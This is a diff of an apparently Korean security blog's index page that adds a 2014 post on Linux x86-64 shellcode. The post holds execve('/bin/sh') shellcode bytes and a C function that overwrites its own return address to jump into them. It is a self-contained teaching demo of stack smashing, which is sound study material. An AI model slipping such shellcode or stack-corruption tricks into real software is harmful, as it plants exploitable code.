@@ -9,8 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Linux x86_64 shellcode section .text global _start
-_start: xor rdx,rdx mov qword rbx, '//bin/sh' shr rbx,0x8 push rbx mov rdi,rsp xor rax,rax push &hellip;">
+  <meta name="description" content="callee 스택을 파괴하는 예제를 짜보았다. callee stackframe 에서 return address 를 _shellcode 의 어드레스로 바꿔서 retq 가 실행될때 저기로 튀도록 한다. char *_shellcode = "" "\x48\x31\xd2 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +65,71 @@ _start: xor rdx,rdx mov qword rbx, '//bin/sh' shr rbx,0x8 push rbx mov rdi,rsp x
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/09/linux-x86-64-shellcode-2/">Linux X86_64 Shellcode 2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-09T15:32:12+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:32 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>callee 스택을 파괴하는 예제를 짜보았다.</p>
+
+<p>callee stackframe 에서 return address 를 <code>_shellcode</code> 의 어드레스로 바꿔서 <code>retq</code> 가 실행될때 저기로 튀도록 한다.</p>
+
+<pre><code>char *_shellcode = ""
+    "\x48\x31\xd2"      /* xor rdx,rdx */
+    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  /* mov qword rbx, '//bin/sh' */
+    "\x48\xc1\xeb\x08"  /* shr rbx,0x8 */
+    "\x53"              /* push rbx */
+    "\x48\x89\xe7"      /* mov rdi,rsp */
+    "\x48\x31\xc0"      /* xor rax,rax */
+    "\x50"              /* push rax */
+    "\x57"              /* push rdi */
+    "\x48\x89\xe6"      /* mov rsi,rsp */
+    "\xb0\x3b"          /* mov al,0x3b */
+    "\x0f\x05" ;        /* syscall */
+
+void explode() {
+    long *ret;
+    ret = (long *)&amp;ret;
+#if 1
+    ret++; // now points saved %rbp
+    ret++; // now points return address
+#else
+    __asm__(
+    "add $16,%rax\n\t"
+    "mov %rax, -0x8(%rbp)\n\t"
+    );
+#endif
+    *ret = _shellcode;
+}
+
+main()
+{
+    explode();
+}
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -903,35 +967,6 @@ m2.invoke(sm, null, pdu, null, null, false, false);
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/08/20/cellular-exploitation/">Cellular Exploitation</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-08-20T11:04:36+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:04 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Ralph-Philipp Weinmann 의 <a href="https://www.usenix.org/system/files/conference/woot12/woot12-final24.pdf">Baseband Attacks: Remote Exploitation of Memory Corruptions in Celluar Protocol Stacks</a> 를 정리한다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/13">&larr; Older</a>
@@ -949,6 +984,10 @@ m2.invoke(sm, null, pdu, null, null, false, false);
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/03/03/the-drown-attack/">The DROWN Attack</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/02/25/mnist-for-ml-beginners/">MNIST for ML Beginners</a>
       </li>
     
@@ -962,10 +1001,6 @@ m2.invoke(sm, null, pdu, null, null, false, false);
     
       <li class="post">
         <a href="/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security/">Unlocking the Motorola Bootloader by Azimuth Security</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/11/how2heap/">How2heap</a>
       </li>
     
   </ul>
